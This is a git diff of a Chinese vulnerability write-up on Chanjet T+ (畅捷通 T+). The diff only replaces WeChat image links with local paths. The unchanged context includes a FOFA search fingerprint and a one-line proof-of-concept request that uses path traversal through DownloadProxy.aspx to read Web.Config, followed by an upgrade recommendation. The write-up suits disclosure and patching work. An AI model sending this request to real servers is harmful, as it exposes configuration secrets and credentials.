@@ -67,13 +67,13 @@ app="畅捷通-TPlus"
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVwokhO2YicQwKBdcyRkqTyxbLlIsTZPMQ8TSXCX2dJUVPyWf7GU7Zuc6jVRfWoQ4gxpPfdVwCrWhbw/640?wx_fmt=png)
+![](../../.resource/remote/266cf07b6c5dddf6d4a2bb757589f7357076eabf05516c4cd0f8d422421dcc9d.png)
 
 **漏洞复现**
 
 登录页面如下  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVwokhO2YicQwKBdcyRkqTyxbVR6LDKniad9JaSsXKjnJDW2VuA95iblxTGq1EA3kBjr0eD0EzFgZPUCQ/640?wx_fmt=png)
+![](../../.resource/remote/098337ca46beb4b29ff165184a5c7eb73d821833155e7a801d8437e555b0f43d.png)
 
 POC：
 
@@ -82,13 +82,13 @@ GET /tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config HTTP/1.1
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVwokhO2YicQwKBdcyRkqTyxbqPP4ZfMfZKWD0Yx69auSCSek8NPc8URvBxdQKryrMm93ygwrFibUAaQ/640?wx_fmt=png)
+![](../../.resource/remote/6bef639aef747d6776b49d065c5ffbf6e1c2261a592b397b0c8918200faa727b.png)
 
 **修复建议**
 
 建议升级至安全版本  
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/n2rSqJSRAVysra7ItOufZQ85GXBSX9vYa0PicnDzIv4xibegRTm4976s4ZMcq0Ke9uH8TG8RqC4ZbaXK33IrmicxA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)
+![](../../.resource/remote/a42c9c7ebb117f1b9d9d8da381ddae972cc83b939df4fabf72bbb68309698bca.jpg)
 
 **本文版权归作者和微信公众号平台共有，重在学习交流，不以任何盈利为目的，欢迎转载。**
 
